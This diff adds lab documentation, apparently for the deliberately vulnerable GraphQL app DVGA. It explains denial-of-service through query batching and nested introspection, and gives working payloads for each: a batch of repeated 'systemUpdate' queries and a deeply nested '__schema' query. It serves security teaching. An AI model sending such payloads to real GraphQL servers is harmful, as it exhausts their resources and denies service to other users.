@@ -1,0 +1,47 @@
+In GraphQL, request batching offers an implementation through which multiple GraphQL queries can be sent in one HTTP request to the server.
+These requests are executed sequentially and the results for all the queries are sent back in one HTTP response by the server.
+This feature can be leveraged to cause a DOS when used with queries that are significantly resource intensive.
+
+To illustrate this, I will use the "systemUpdate" query.
+When this query is issued by the client, a long time goes by before a response is received from the server.
+If we batch multiple such queries into a single HTTP request, we can occupy the server resources for an even longer period of time.
+Without any moderation, such batch queries can overwhelm the server, causing a DOS for other users of the system.
+
+	[
+		{"query":"query DenialOfService { systemUpdate }"},
+		{"query":"query DenialOfService { systemUpdate }"},
+		{"query":"query DenialOfService { systemUpdate }"},
+		{"query":"query DenialOfService { systemUpdate }"},
+		{"query":"query DenialOfService { systemUpdate }"},
+		{"query":"query DenialOfService { systemUpdate }"},
+		{"query":"query DenialOfService { systemUpdate }"}
+	]	
+
+A denial of service can also arise as a result of DVGA's support for introspection.
+GraphQL's schema has a circular relationship, which makes it possible to create a nested GraphQL introspection query that can exponentially increase in complexity.
+
+Consider the following query:
+	query DenialOfService {  
+	    __schema {  
+	        types {  
+        	    fields {  
+                	type{  
+	                    fields {  
+        	                type {  
+                	            fields {  
+                        	        type {  
+                                	    fields {  
+                                        	name  
+	                                    }  
+        	                        }  
+                	            }  
+                        	}  
+	                    }  
+        	        }  
+	            }  
+        	}  
+	    }  
+	}
+
+This query contains several layers of the same fields. These layers can continuously be nested, causing them to occupy server resources for an even longer time.
+
